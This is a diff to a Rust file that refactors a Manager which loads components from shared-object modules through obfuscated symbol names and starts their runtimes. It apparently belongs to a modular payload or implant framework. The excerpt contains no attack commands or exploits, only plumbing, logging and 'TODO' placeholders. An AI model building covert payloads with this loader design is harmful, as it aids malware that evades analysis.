@@ -5,37 +5,35 @@ use std::{
     time::Duration,
 };
 
-use unshell_obfuscate::symbol;
-
 use crate::{
     config::{NamedComponent, PayloadConfig, RuntimeConfig},
     *,
 };
 use module::Module;
+use unshell_obfuscate::symbol;
 
 // #[derive(Debug)]
-pub struct Manager<'a> {
+pub struct Manager {
     id: &'static str,
 
-    modules: Vec<Module>,
+    pub modules: Vec<Module>,
 
-    active_runtimes: Vec<&'a dyn ModuleRuntime>,
+    active_runtimes: Vec<Box<dyn ModuleRuntime>>,
     // runtime_config: Vec<RuntimeConfig>,
-    components: HashMap<String, &'a NamedComponent>,
+    components: HashMap<String, NamedComponent>,
 }
 
 // static mut MANAGER_RUNTIME: Option<Arc<Mutex<Manager>>> = None;
 
-impl<'a> Manager<'a> {
-    fn new(id: &'static str, config: &'a Vec<NamedComponent>, modules: Vec<Module>) -> Self {
+impl Manager {
+    fn new(id: &'static str, config: Vec<NamedComponent>, modules: Vec<Module>) -> Self {
         Self {
             id,
-
-            // config,
             modules,
-
-            components: config.iter().map(|c| (c.name.to_string(), c)).collect(),
-
+            components: config
+                .into_iter()
+                .map(|c| (c.name.to_string(), c))
+                .collect(),
             active_runtimes: Vec::new(),
         }
     }
@@ -44,54 +42,49 @@ impl<'a> Manager<'a> {
     #[allow(static_mut_refs)]
     pub fn run(config: &'static PayloadConfig, modules: Vec<Module>) {
         // Construct self
-        let this = Self::new(&config.id, &config.components, modules);
+        let mut this = Self::new(&config.id, config.components.clone(), modules);
 
         // Load each of the pre-prepared modules
-        // this.load_components();
+        this.load_components();
 
         let this = Arc::new(Mutex::new(this));
 
         Self::start_runtimes(this.clone(), &config.runtime_config);
 
-        // let components = this.components.clone();
-
-        // let mut runtimes: Vec<Box<dyn ModuleRuntime>> = Vec::new();
-
-        // for (_name, component) in components {
-        //     let module_runtime = component.start_runtime(this.clone());
-        //     if let Some(module_runtime) = module_runtime {
-        //         runtimes.push(module_runtime);
-        //     }
-        // }
+        // drop(config);
 
         Self::join(this);
     }
 
-    // fn load_components(&mut self) {
-    //     for i in 0..self.modules.len() {
-    //         debug!("Importing module {}", i);
-    //         // let this_lock = .unwrap();
-    //         let component_func = if let Ok(component_func) = self.modules[i]
-    //             .get_symbol::<fn() -> HashMap<&'static str, Box<dyn Component>>>(
-    //                 symbol!("get_components").as_bytes(),
-    //             ) {
-    //             component_func
-    //         } else {
-    //             warn!("get_components function not found");
-    //             continue;
-    //         };
+    fn load_components(&mut self) {
+        for module in &self.modules {
+            // Load get_components function from shared object library
+            let component_func = match module
+                .get_symbol::<fn() -> Vec<NamedComponent>>(symbol!(b"get_components"))
+            {
+                Ok(func) => func,
+                Err(_) => {
+                    warn!("get_components function not found");
+                    continue;
+                }
+            };
 
-    //         let components = component_func();
+            let components = component_func();
+            let component_name = "TODO";
 
-    //         let len = components.len();
-    //         debug!("[{}] Loaded {} components", i, len);
+            debug!("{} - Retrieved payload metadata", component_name);
 
-    //         self.components.extend(components);
-    //     }
-    // }
+            // Add each component into self
+            for c in components {
+                debug!("{} - Found component '{}'", "TODO", c.name);
+                self.components.insert(c.name.to_owned(), c);
+            }
+        }
+    }
 
     /// Start each runtime
     fn start_runtimes(this: Arc<Mutex<Self>>, runtimes: &'static Vec<RuntimeConfig>) {
+        debug!("Starting runtimes...");
         for runtime in runtimes {
             let mut this_lock = this.lock().unwrap();
 
@@ -105,6 +98,8 @@ impl<'a> Manager<'a> {
                     continue;
                 }
             };
+
+            debug!("Starting runtime: {}", runtime.name);
 
             let runtime = match (*component.start_runtime)(runtime) {
                 Ok(runtime) => runtime,
